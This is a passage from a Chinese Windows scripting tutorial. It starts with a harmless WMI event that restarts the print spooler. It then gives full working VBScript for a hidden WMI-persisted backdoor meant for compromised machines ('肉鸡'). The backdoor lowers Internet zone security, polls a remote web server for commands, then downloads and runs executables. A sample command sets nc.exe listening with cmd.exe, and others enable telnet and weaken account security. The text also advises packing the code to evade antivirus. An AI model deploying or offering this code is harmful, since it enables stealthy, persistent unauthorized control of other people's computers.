	evtflt.querylanguage="wql" '定义查询语言(只能是wql)'
	set fltpath=evtflt.put_ '注册过滤器，返回其链接'
	
	set fcbnd=getobject(nslink&"__FilterToConsumerBinding").spawninstance_ '创建过滤器和消费者的绑定'
	fcbnd.consumer=asecpath.path '指定消费者'
	fcbnd.filter=fltpath.path '指定过滤器'
	fcbnd.put_ '执行绑定'
	
	wscript.echo "安装完成"

这个脚本的效果是：当“后台打印”服务(spooler)状态改变为停止时，消费者将进行处理——重启spooler。
先net start spooler，然后net stop spooler。最多5秒钟，spooler又会启动。

直接运行上面的脚本会出错，因为“活动脚本事件消费者”(ActiveScriptEventConsumer ASEC)默认没有被安装到root/cimv2名字空间。

用记事本打开%windir%/system32/wbem/scrcons.mof，将第一行“#pragma namespace ("////.//Root//Default")”删除，或者修改为“#pragma namespace ("////.//Root//cimv2")”。XP/2003没有这一行，不用修改。
然后执行下面这个命令：

C:/WINNT/system32/wbem>mofcomp.exe -N:root/cimv2 scrcons.mof
Microsoft (R) 32-bit MOF 汇编器版本 1.50.1085.0007
版权所有 (c) Microsoft Corp. 1997-1999。保留所有权利。

- 正在分析 MOF 文件: scrcons.mof
- MOF 文件分析成功
- 将数据储存到储备库中...
- 已完成!

这样就把ASEC安装到root/cimv2了。mofcomp.exe和scrcons.mof都是系统自带的。

2000默认将ASEC安装到root/default名字空间，而XP/2003默认已经安装到root/subscription名字空间，但由于事件过滤器不能跨名字空间捕捉事件（XP/2003可以），事件绑定也不能跨名字空间，而大部分事件都在root/cimv2产生，所以需要重新安装ASEC到事件源所在的名字空间。下面这个脚本自动完成ASEC重安装任务。

	set shl=createobject("WScript.Shell")
	set fso=createobject("Scripting.FileSystemObject")
	path=shl.expandenvironmentstrings("%windir%/system32/wbem/")
	set mof=fso.opentextfile(path&"scrcons.mof",1,false,-1) 'mof都是Unicode格式的'
	mofs=mof.readall
	mof.close
	mofs=replace(mofs,"//Default","//cimv2",1,1) '替换默认的名字空间'
	mofp=path&"asecimv2.mof"
	set mof=fso.createtextfile(mofp,false,true) '创建临时mof文件'
	mof.write mofs
	mof.close
	shl.run path&"mofcomp.exe -N:root/cimv2 "&mofp,0,true '安装到root/cimv2'
	fso.deletefile(mofp)
	wscript.echo "安装完成"

注销永久事件：

	nslink="winmgmts://./root/cimv2:"
	myconsumer="stopped_spooler_restart_consumer" '指定消费者的名字'
	myfilter="stopped_spooler_filter" '指定过滤器的名字'
	set binds=getobject(nslink&"__FilterToConsumerBinding").instances_
	for each bind in binds
		if strcomp(right(bind.consumer,len(myconsumer)+1),myconsumer&chr(34),1)=0 _
		and strcomp(right(bind.filter,len(myfilter)+1),myfilter&chr(34),1)=0 then
			getobject("winmgmts:"&bind.consumer).delete_ '删除消费者'
			getobject("winmgmts:"&bind.filter).delete_ '删除过滤器'
			bind.delete_ '删除绑定'
			exit for
		end if
	next
	wscript.echo "卸载完成"

除了ASEC，WMI还提供其他永久事件消费者，比如SMTPEventConsumer。当系统出现异常时，可以通过它自动给管理员的信箱发信。WMITools里的WMI Event Registration用于创建、修改、删除指定名字空间里的永久事件消费者、事件过滤器和计时器事件源的实例，以及绑定或解除绑定它们。

关于事件处理机制的各个部分，在《WMI技术指南》里有详细的讲述，MSDN里当然更全面。我就点到为止了。

（看累了吧，喝口水，休息一下 ^_^）

下面开始讨论脚本后门。

WMI提供了两个计时器：__AbsoluteTimerInstruction和__IntervalTimerInstruction，分别在指定的时刻和时间间隔触发事件，注册一个过滤器来捕获计时器事件，再和ASEC绑定，我们就获得了一种少见的程序自启动的方法。而且，脚本代码完全隐藏在CIM存储库中，不以独立的文件存在，查杀比较困难。这是脚本后门的优势，但困难也不少：

1，脚本运行时，由系统自带的scrcons.exe作为脚本宿主（Windows的设计者还没有笨到用WMI服务作为脚本宿主）。这就会增加一个进程，虽然是系统正常的进程，杀毒软件拿它没辙，但还是太显眼了。所以，不能让脚本一直在后台运行，而是应该每隔一段时间启动一次，然后尽快结束。脚本结束后，scrcons.exe进程不会自动结束，必须让脚本借助WMI提供的Win32_Process对象主动终止宿主进程（煮豆燃豆萁？！）。

2，脚本的网络功能很差，基本上只能依靠Microsoft.XMLHTTP之类的对象。因此，脚本后门不能监听端口并提供cmd shell，只能反向连接到web服务器，获取控制命令。一个可行的办法是，在web服务器上放一个命令文件，脚本后门根据域名找到服务器并下载命令文件，再根据文件内容作出响应。所以，你需要一台web服务器，或者用netbox等工具建个临时服务器。当然，你不需要让服务器总是在线，需要控制脚本后门时再运行就可以了。

3，由于脚本后门间歇式运行，需要防止重复运行同一个命令。解决方法是在注册表里记录命令的长度，每次获取命令后将长度和记录做比较，如果相同则跳过，不同则覆盖并执行命令。

4，为了借助ie对象穿透防火墙，XMLHTTP对象必须在ie中被创建，这会受到Internet域安全级别的限制。即使将代码保存在html文件中再用ie打开，也不过是“我的电脑”域，创建不安全的ActiveX对象还是会弹出警告对话框。解决办法是修改注册表，临时更改安全设置。

5，WScript对象由wscript.exe或cscript.exe提供，而scrcons.exe没有提供，所以很多常用的功能，比如WScript.Sleep都不能用了。不能Sleep就无法异步使用XMLHTTP，而同步XMLHTTP可能被长时间阻塞，大大不利于后门的隐蔽。调用ping命令来延时会创建新进程，用WScript.Shell的Popup方法延时则有“咚”一声提示音。好在Microsoft.XMLHTTP的“亲戚”不少，比如Msxml2.XMLHTTP、Msxml2.ServerXMLHTTP、Msxml2.DOMDocument、WinHttp.WinHttpRequest等。最后那个可以设置超时时间，刚好满足需要。

即使有重重困难，脚本后门仍然值得挑战一下。当肉鸡上的各类木马纷纷被杀毒软件肃清后，一个24小时才运行一次的脚本后门可能是你最后的希望。

下面是一个简单的脚本后门的核心代码（没有安装功能）：

	cmdu="http://myweb.8866.org/cmd.txt" '从web服务器获取命令的url'
	cmdw=4000 '下载超时时间4秒'
	cmdl="HKLM/SOFTWARE/Microsoft/WBEM/CIMOM/CmdLength" '记录命令长度的键值名'
	
	on error resume next '忽略非致命错误 '（调试时注释掉本行）
	set shl=createobject("WScript.Shell") '虽然不能使用WScript根对象，其子对象还是可以用的'
	set aso=createobject("ADODB.Stream")
	set ie=createobject("InternetExplorer.Application") '使用ie绕过防火墙'
	
	zone="HKCU/SOFTWARE/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/3"
	set1=zone&"/1201"
	set2=zone&"/1400"
	set3=zone&"/CurrentLevel"
	val1=shl.regread(set1) '保存原来的安全设置'
	val2=shl.regread(set2)
	val3=shl.regread(set3)
	regd="REG_DWORD"
	shl.regwrite set1,0,regd '允许在Internet域运行不安全的ActiveX'
	shl.regwrite set2,0,regd '允许活动脚本'
	shl.regwrite set3,0,regd '设置当前Internet域安全级别为“自定义”'
	
	ie.visible=0 ':ie.visible=1 '（调试用）
	ie.navigate "about"&":blank" '这里使用字符串连接纯属反论坛过滤'
	ie.document.write _
	"<script>function whr(){return new ActiveXObject('WinHttp.WinHttpRequest.5.1')}</script>"
	set whr=ie.document.script.whr() '在ie内创建WinHttpRequest对象'
	
	whr.settimeouts cmdw,cmdw,cmdw,cmdw '设置域名解析、连接、发送和接收超时时间'
	whr.open "GET",cmdu,true '获取命令文件'
	whr.send
	if not whr.waitforresponse(cmdw) then die
	if whr.status>299 then die
	rt=whr.responsetext ':wscript.echo rt '（调试用）
	':shl.regwrite cmdl,0,regd '（调试用）
	if len(rt)=shl.regread(cmdl) then die '与前一个命令的长度比较'
	shl.regwrite cmdl,len(rt),regd '更新命令长度'
	cmds=split(rt,vbcrlf,-1)
	if ubound(cmds)<1 then die
	cmdt=lcase(trim(cmds(0))) ':wscript.echo cmdt '（调试用）
	
	aso.type=1
	aso.open
	cd=shl.currentdirectory&chr(92)
	select case cmdt '分析命令文件类型'
		case "'vbs" '是vbs'
			execute(rt) '直接在当前脚本上下文中执行'
			die
		case ":bat" '是批处理'
			aso.write whr.responsebody
			aso.savetofile cd&"_.bat",2 '保存在当前目录'
			aso.close
			shl.run chr(34)&cd&"_.bat""",0 '运行批处理'
			die
		case "'wsh" '是Windows脚本'
			aso.write whr.responsebody
			aso.savetofile cd&"_.vbs",2 '保存在当前目录'
			aso.close
			shl.run "cscript.exe """&cd&"_.vbs""",0 '使用cscript作为脚本宿主'
			die
		case "exe" 'exe需进一步分析'
		case else die
	end select
	
	if ubound(cmds)<4 then die ':wscript.echo cmds(1) '（调试用）
	whr.open "GET",cmds(1),true '从指定位置下载exe文件'
	whr.send
	if not whr.waitforresponse(cmds(2)) then die
	if whr.status>299 then die
	path=shl.expandenvironmentstrings(cmds(3))'展开保存路径中的环境变量'
	aso.write whr.responsebody ':wscript.echo path '（调试用）
	aso.savetofile path,2 '保存exe文件'
	aso.close
	shl.run chr(34)&path&""" "&cmds(4),0 '执行exe'
	
	die
	
	sub die
		ie.quit
		shl.regwrite set1,val1,regd '还原Internet域安全设置'
		shl.regwrite set2,val2,regd
		shl.regwrite set3,val3,regd
		for each ps in getobject("winmgmts://./root/cimv2:win32_process").instances_
			if lcase(ps.name)="scrcons.exe" then ps.terminate '自杀'
		next
		'wscript.echo "die": wscript.quit '（调试用）
	end sub

取消调试语句的注释，上面这段核心代码就可以直接运行。
它将试图从myweb.8866.org上获取cmd.txt，根据里面的内容进一步行动。
cmd.txt看起来像这样：

- exe //被执行的文件类型，可以是'vbs、:bat、exe或'wsh
- http://myweb.8866.org/nc.exe //被执行的文件的下载url
- 4000 //下载超时时间，单位毫秒
- %windir%/system32/nc.exe //文件的保存位置，支持环境变量
- -L -p 1234 -e cmd.exe //命令行参数

收到上面这个命令后，脚本将从指定url下载nc.exe，保存到系统目录并运行。

如果第一行的文件类型为'vbs、'wsh或:bat，则把命令文件本身当作脚本或批处理来执行。比如：

	:bat
	net start telnet　　　　　　　　 :启动telnet服务
	del %0　　　　　　　　　　　　　 :自删除

如果只是想让某台主机执行命令，可以这样：

	:bat
	ipconfig | find "123.45.67.89" && net start telnet
	del %0

这样就只有ip地址为123.45.67.89的主机才会启动telnet。

'wsh和'vbs的区别是，前者保存为文件由cscript.exe调用，后者直接在脚本后门“内部”执行。
使用'vbs的好处是不用生成文件，而且可以直接利用后门中已经创建的对象，比如shl，但也因此不能用WScript根对象。

下面的'vbs命令文件把"本地帐户的共享和安全模式"由"仅来宾"改为"经典"（对XP和2003有效）：

	'vbs
	shl.regwrite "HKLM/SYSTEM/CurrentControlSet/Control/Lsa/forceguest",0,"REG_DWORD"

注意，vbs和wsh前面都有一个单引号，因为整个命令文件都作为脚本执行，所以必须注释掉第一行，:bat也是一样。
使用'vbs时千万注意不要有语法错误，否则会使后门出错并停止。如果是复杂的脚本，建议使用'wsh。

将核心代码改写为单行字符串格式，就可以作为ASEC的实例安装了。改写时要注意"if"和"end if"配对以及去掉续行符。
完整的安装脚本代码如下：

'***以下为参数配置，请根据情况自行修改***'

- nslink="winmgmts://./root/cimv2:" 'ASEC所在的名字空间'
- doorname="vbscript_backdoor" '记住后门的名字，卸载时需要'
- runinterval=86400000 '每天运行一次'
- cmdu="http://myweb.8866.org/cmd.txt" '命令文件的位置'
- cmdw=4000 '文件下载超时时间'
- cmdl="HKLM/SOFTWARE/Microsoft/WBEM/CIMOM/CmdLength" '保存命令长度的键值名'

'***参数配置结束***'

	createobject("WScript.Shell").regwrite cmdl,0,"REG_DWORD"

'脚本后门核心代码'

	stxt="cmdu="""&cmdu&""":cmdw="&cmdw&":cmdl="""&cmdl&""":on error resume next:set shl=createobject(""WScript.Shell""):set aso=createobject(""ADODB.Stream""):set ie=createobject(""InternetExplorer.Application""):zone=""HKCU/SOFTWARE/Microsoft/Windows/CurrentVersion/Internet Settings/Zones/3"":set1=zone&""/1201"":set2=zone&""/1400"":set3=zone&""/CurrentLevel"":val1=shl.regread(set1):val2=shl.regread(set2):val3=shl.regread(set3):regd=""REG_DWORD"":shl.regwrite set1,0,regd:shl.regwrite set2,0,regd:shl.regwrite set3,0,regd:ie.visible=0:ie.navigate ""about""&"":blank"":ie.document.write ""<script>function whr(){return new ActiveXObject('WinHttp.WinHttpRequest.5.1')}</script>"":with ie.document.script.whr():.settimeouts cmdw,cmdw,cmdw,cmdw:.open ""GET"",cmdu,true:.send:if not .waitforresponse(cmdw) then die:end if:if .status>299 then die:end if:rt=.responsetext:if len(rt)=shl.regread(cmdl) then die:end if:shl.regwrite cmdl,len(rt),regd:cmds=split(rt,vbcrlf,-1):if ubound(cmds)<1 then die:end if:cmdt=lcase(trim(cmds(0))):aso.type=1:aso.open:cd=shl.currentdirectory&chr(92):select case cmdt:case ""'vbs"":execute(rt):die:case "":bat"":aso.write .responsebody:aso.savetofile cd&""_.bat"",2:aso.close:shl.run chr(34)&cd&""_.bat"""""",0:die:case ""'wsh"":aso.write .responsebody:aso.savetofile cd&""_.vbs"",2:aso.close:shl.run ""cscript.exe """"""&cd&""_.vbs"""""",0:die:case ""exe"":case else die:end select:if ubound(cmds)<4 then die:end if:.open ""GET"",cmds(1),true:.send:if not .waitforresponse(cmds(2)) then die:end if:if .status>299 then die:end if:path=shl.expandenvironmentstrings(cmds(3)):aso.write .responsebody:aso.savetofile path,2:aso.close:shl.run chr(34)&path&"""""" ""&cmds(4),0:end with:die:sub die:ie.quit:shl.regwrite set1,val1,regd:shl.regwrite set2,val2,regd:shl.regwrite set3,val3,regd:for each ps in getobject(""winmgmts://./root/cimv2:win32_process"").instances_:if lcase(ps.name)=""scrcons.exe"" then ps.terminate:end if:next:end sub"

'配置事件消费者'

	set asec=getobject(nslink&"ActiveScriptEventConsumer").spawninstance_
	asec.name=doorname&"_consumer"
	asec.scriptingengine="vbscript"
	asec.scripttext=stxt
	set asecpath=asec.put_

'配置计时器'

	set itimer=getobject(nslink&"__IntervalTimerInstruction").spawninstance_
	itimer.timerid=doorname&"_itimer"
	itimer.intervalbetweenevents=runinterval
	itimer.skipifpassed=false
	itimer.put_

'配置事件过滤器'

	set evtflt=getobject(nslink&"__EventFilter").spawninstance_
	evtflt.name=doorname&"_filter"
	evtflt.query="select * from __timerevent where timerid="""&doorname&"_itimer"""
	evtflt.querylanguage="wql"
	set fltpath=evtflt.put_

'绑定消费者和过滤器'

	set fcbnd=getobject(nslink&"__FilterToConsumerBinding").spawninstance_
	fcbnd.consumer=asecpath.path
	fcbnd.filter=fltpath.path
	fcbnd.put_
	
	wscript.echo "安装完成"

与前一个永久事件处理过程不同的是，脚本后门的事件源是计时器，在每个名字空间都可以实例化并触发事件。所以，不一定要将ASEC安装到root/cimv2。特别是XP/2003，ASEC默认已经安装到root/subscription，只需要相应修改nslink的值，就可以安装脚本后门了。

卸载脚本后门：

	cmdl="HKLM/SOFTWARE/Microsoft/WBEM/CIMOM/CmdLength"
	createobject("WScript.Shell").regdelete cmdl '删除保存命令长度的键值'
	nslink="winmgmts://./root/cimv2:"
	doorname="vbscript_backdoor" '根据脚本后门的名字找到各个对象实例'
	myconsumer=doorname&"_consumer"
	mytimer=doorname&"_itimer"
	myfilter=doorname&"_filter"
	set binds=getobject(nslink&"__FilterToConsumerBinding").instances_
	for each bind in binds
	if strcomp(right(bind.consumer,len(myconsumer)+1),myconsumer&chr(34),1)=0 _
	and strcomp(right(bind.filter,len(myfilter)+1),myfilter&chr(34),1)=0 then
	bind.delete_
	exit for
	end if
	next
	getobject(nslink&"ActiveScriptEventConsumer.Name="""&myconsumer&"""").delete_
	getobject(nslink&"__IntervalTimerInstruction.TimerId="""&mytimer&"""").delete_
	getobject(nslink&"__EventFilter.Name="""&myfilter&"""").delete_
	wscript.echo "卸载完成"

几点补充说明：

1，脚本后门的优势在于隐蔽，所以24小时才运行一次是合适的。不用担心因为系统关机而错过运行机会，下次启动时会补上的。

2，为了更好的反查杀，可以给脚本后门的核心代码加壳。在功能上也可以改进到接近IRC木马的程度，只不过服务端是Web服务器，不能同时养太多的马。

3，脚本后门的自启动和运行依赖于WMI服务，虽然禁用WMI服务就可以杜绝此类后门和木马，但比起通过注册表启动还是可靠的多。如果被蠕虫病毒利用，恐怕会很麻烦吧。

# 【结语】 #
Windows脚本就像万能胶，能够把独立的程序、服务、控件组合起来完成任务。脚本编程的技巧就是组合的技巧。XP和2003比2000自带更多的命令行工具，WMI也大大加强了，脚本的功能水涨船高，可以说是“只有想不到，没有做不到”。一切有待你的发掘。

最后，感谢你耐心看完本文，希望本文可以为你学习Windows脚本提供一些帮助。


# 【参考资料】 #
[1] 《Windows脚本技术》 介绍Windows脚本的基础知识
http://download.microsoft.com/download/winscript56/Install/5.6/W982KMe/CN/scd56chs.exe

[2] WMITools 学习脚本必备，包括CIM Studio、Event Registration、Event Viewer和Object Browser四个工具
http://download.microsoft.com/download/.NetStandardServer/Install/V1.1/NT5XP/EN-US/WMITools.exe

[3] 《WMI技术指南》 出版社：机械工业出版社 作者：Marcin Policht
http://www.huachu.com.cn/itbook/itbookinfo.asp?lbbh=BH99801035

[4] 《System Administration Scripting Guide》 包含大量WMI脚本示例
http://www.sometips.com/soft/script_repository.chm

[5] Script Encoder 官方脚本编码工具
http://download.microsoft.com/download/winscript56/Install/1.0/WIN98MeXP/CN/sce10chs.exe

[6] 微软脚本中心
http://www.microsoft.com/china/technet/community/scriptcenter/default.mspx

[7] 《MS Windows Script Host 2.0 Developers Guide》
http://www.sometips.com/soft/wsh.zip